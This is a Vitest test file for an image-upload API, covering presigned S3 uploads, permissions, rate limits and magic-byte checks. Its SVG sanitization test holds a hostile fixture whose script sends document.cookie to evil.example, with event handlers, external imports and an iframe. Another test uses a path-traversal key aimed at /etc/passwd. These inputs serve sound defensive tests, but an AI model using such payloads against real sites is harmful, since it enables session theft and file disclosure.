import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest'
import request from 'supertest'
import type { Express } from 'express'
import { MAX_UPLOAD_BYTES } from '@coboard/shared'
import { createApp } from '../http/app.js'
import { prisma } from '../lib/prisma.js'
import { closeRedis, redis, waitForRedis } from '../lib/redis.js'
import { resetEnvCache } from '../lib/env.js'
import { resetStorageClient } from '../lib/s3.js'
import { startFakeS3, type FakeS3 } from '../dev/fakeS3.js'

/**
 * Image uploads — FR-CANVAS-010, TRD §4.4, R-SEC-011/012/013. Phase 13a.
 *
 * Against a real HTTP S3 stand-in (dev/fakeS3.ts), so the presigned PUT and
 * the confirm's read-back go over the wire through the real AWS SDK. The fake
 * does not verify signatures (D13-3); what is proven here is our side.
 */

let app: Express
let s3: FakeS3
const saved: Record<string, string | undefined> = {}
const password = 'correct-horse-1'
let counter = 0

interface Actor {
  token: string
  userId: string
}

async function signUp(): Promise<Actor> {
  const email = `up${++counter}.${Date.now()}@example.com`
  const response = await request(app)
    .post('/api/auth/register')
    .send({ email, password, displayName: 'Priya Raman' })
  expect(response.status).toBe(201)
  const user = await prisma.user.findUniqueOrThrow({ where: { emailLower: email } })
  return { token: response.body.accessToken as string, userId: user.id }
}

const auth = (actor: Actor) => ({ Authorization: `Bearer ${actor.token}` })

async function createBoard(actor: Actor): Promise<string> {
  const response = await request(app)
    .post('/api/boards')
    .set(auth(actor))
    .send({ name: 'Moodboard' })
  return response.body.board.id as string
}

const PNG = new Uint8Array([
  0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13, 0x49, 0x48, 0x44, 0x52,
])
const JPEG = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0, 16, 0x4a, 0x46, 0x49, 0x46])
/** A Windows executable's header, renamed to cat.png — the classic disguise. */
const EXE = new Uint8Array([0x4d, 0x5a, 0x90, 0, 3, 0, 0, 0, 4, 0, 0, 0, 0xff, 0xff])

async function presign(actor: Actor, boardId: string, contentType: string, size: number) {
  return request(app)
    .post('/api/uploads/presign')
    .set(auth(actor))
    .send({ boardId, filename: 'cat.png', contentType, size })
}

/** Presign, PUT the bytes the way the browser does, then confirm. */
async function upload(
  actor: Actor,
  boardId: string,
  contentType: string,
  body: Uint8Array,
) {
  const signed = await presign(actor, boardId, contentType, body.length)
  expect(signed.status).toBe(200)
  const put = await fetch(signed.body.uploadUrl as string, {
    method: 'PUT',
    body: Buffer.from(body),
    headers: signed.body.headers as Record<string, string>,
  })
  expect(put.status).toBe(200)
  const confirm = await request(app)
    .post('/api/uploads/confirm')
    .set(auth(actor))
    .send({ key: signed.body.key })
  return { signed, confirm, key: signed.body.key as string }
}

const stored = (key: string) => s3.objects.get(`coboard/${key}`)

beforeAll(async () => {
  s3 = await startFakeS3()
  for (const k of ['S3_ENDPOINT', 'S3_ACCESS_KEY', 'S3_SECRET_KEY', 'S3_BUCKET'])
    saved[k] = process.env[k]
  Object.assign(process.env, {
    S3_ENDPOINT: s3.url,
    S3_ACCESS_KEY: 'test',
    S3_SECRET_KEY: 'test-secret',
    S3_BUCKET: 'coboard',
  })
  resetEnvCache()
  resetStorageClient()
  app = createApp()
  await waitForRedis()
})

beforeEach(async () => {
  await prisma.user.deleteMany({})
  s3.objects.clear()
  const keys = [...(await redis().keys('rl:*')), ...(await redis().keys('perm:*'))]
  if (keys.length > 0) await redis().del(...keys)
})

afterAll(async () => {
  for (const [k, v] of Object.entries(saved)) {
    if (v === undefined) delete process.env[k]
    else process.env[k] = v
  }
  resetEnvCache()
  resetStorageClient()
  await s3.close()
  await prisma.$disconnect()
  await closeRedis()
})

describe('POST /uploads/presign', () => {
  it('signs an accepted image for an editor, keyed under the board', async () => {
    const priya = await signUp()
    const boardId = await createBoard(priya)
    const response = await presign(priya, boardId, 'image/png', 1024)
    expect(response.status).toBe(200)
    expect(response.body.key).toMatch(
      new RegExp(`^boards/${boardId}/[0-9a-f-]{36}\\.png$`),
    )
    expect(response.body.publicUrl).toBe(`${s3.url}/coboard/${response.body.key}`)
    expect(response.body.uploadUrl).toContain('X-Amz-Signature=')
  })

  it('refuses an oversized file before issuing any URL — E-05', async () => {
    const priya = await signUp()
    const boardId = await createBoard(priya)
    const response = await presign(priya, boardId, 'image/png', MAX_UPLOAD_BYTES + 1)
    expect(response.status).toBe(413)
    expect(response.body.error.details.reason).toBe('too_large')
    expect(response.body.uploadUrl).toBeUndefined()
  })

  it('refuses a disallowed type before issuing any URL', async () => {
    const priya = await signUp()
    const boardId = await createBoard(priya)
    for (const type of ['application/x-msdownload', 'text/html', 'image/bmp']) {
      const response = await presign(priya, boardId, type, 100)
      expect(response.status).toBe(415)
      expect(response.body.error.details.reason).toBe('unsupported_type')
    }
  })

  it('refuses a viewer and a stranger — R-SEC-001', async () => {
    const priya = await signUp()
    const dana = await signUp()
    const boardId = await createBoard(priya)
    expect((await presign(dana, boardId, 'image/png', 100)).status).toBe(404)
    await prisma.boardMember.create({
      data: { boardId, userId: dana.userId, role: 'VIEWER' },
    })
    expect((await presign(dana, boardId, 'image/png', 100)).status).toBe(403)
  })

  it('allows 20 uploads an hour per user, then 429 — R-SEC-013', async () => {
    const priya = await signUp()
    const boardId = await createBoard(priya)
    for (let i = 0; i < 20; i++) {
      expect((await presign(priya, boardId, 'image/png', 100)).status).toBe(200)
    }
    expect((await presign(priya, boardId, 'image/png', 100)).status).toBe(429)
  })
})

describe('POST /uploads/confirm', () => {
  it('accepts real image bytes and returns the public URL', async () => {
    const priya = await signUp()
    const boardId = await createBoard(priya)
    const { confirm, key } = await upload(priya, boardId, 'image/png', PNG)
    expect(confirm.status).toBe(200)
    expect(confirm.body).toEqual({
      url: `${s3.url}/coboard/${key}`,
      contentType: 'image/png',
    })
    expect(stored(key)).toBeDefined()
  })

  it('rejects and DELETES a renamed executable — magic bytes, not the claimed type', async () => {
    const priya = await signUp()
    const boardId = await createBoard(priya)
    const { confirm, key } = await upload(priya, boardId, 'image/png', EXE)
    expect(confirm.status).toBe(415)
    expect(stored(key)).toBeUndefined()
  })

  it('rejects real image bytes of a DIFFERENT type than was signed for', async () => {
    const priya = await signUp()
    const boardId = await createBoard(priya)
    const { confirm, key } = await upload(priya, boardId, 'image/png', JPEG)
    expect(confirm.status).toBe(415)
    expect(stored(key)).toBeUndefined()
  })

  it('sanitizes an SVG in place: no script, no handlers, no external refs', async () => {
    const priya = await signUp()
    const boardId = await createBoard(priya)
    const hostile = new TextEncoder().encode(
      `<?xml version="1.0"?>
       <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" onload="alert(1)">
         <script>fetch('https://evil.example/'+document.cookie)</script>
         <style>@import url(https://evil.example/x.css);</style>
         <rect width="10" height="10" fill="#4F46E5" onclick="alert(2)"/>
         <image xlink:href="https://evil.example/track.png" width="1" height="1"/>
         <linearGradient id="g"><stop offset="0" stop-color="#4F46E5"/></linearGradient>
         <rect width="4" height="4" fill="url(#g)"/>
         <foreignObject><iframe src="https://evil.example"></iframe></foreignObject>
         <circle r="4" style="fill:url(https://evil.example/p)"/>
       </svg>`,
    )
    const { confirm, key } = await upload(priya, boardId, 'image/svg+xml', hostile)
    expect(confirm.status).toBe(200)
    const clean = stored(key)!.body.toString('utf8')
    expect(clean).toContain('<rect')
    // Same-document references are kept — they are how gradients work.
    expect(clean).toContain('url(#g)')
    for (const banned of [
      '<script',
      'onload',
      'onclick',
      'evil.example',
      '<style',
      'foreignObject',
      'iframe',
    ]) {
      expect(clean).not.toContain(banned)
    }
  })

  it('refuses a key on a board the caller cannot edit, and a malformed key', async () => {
    const priya = await signUp()
    const dana = await signUp()
    const boardId = await createBoard(priya)
    const { key } = await upload(priya, boardId, 'image/png', PNG)
    const theirs = await request(app)
      .post('/api/uploads/confirm')
      .set(auth(dana))
      .send({ key })
    expect(theirs.status).toBe(404)
    const traversal = await request(app)
      .post('/api/uploads/confirm')
      .set(auth(priya))
      .send({ key: `boards/${boardId}/../../etc/passwd` })
    expect(traversal.status).toBe(404)
  })

  it('404s an upload that was signed but never PUT', async () => {
    const priya = await signUp()
    const boardId = await createBoard(priya)
    const signed = await presign(priya, boardId, 'image/png', 16)
    const confirm = await request(app)
      .post('/api/uploads/confirm')
      .set(auth(priya))
      .send({ key: signed.body.key })
    expect(confirm.status).toBe(404)
  })
})
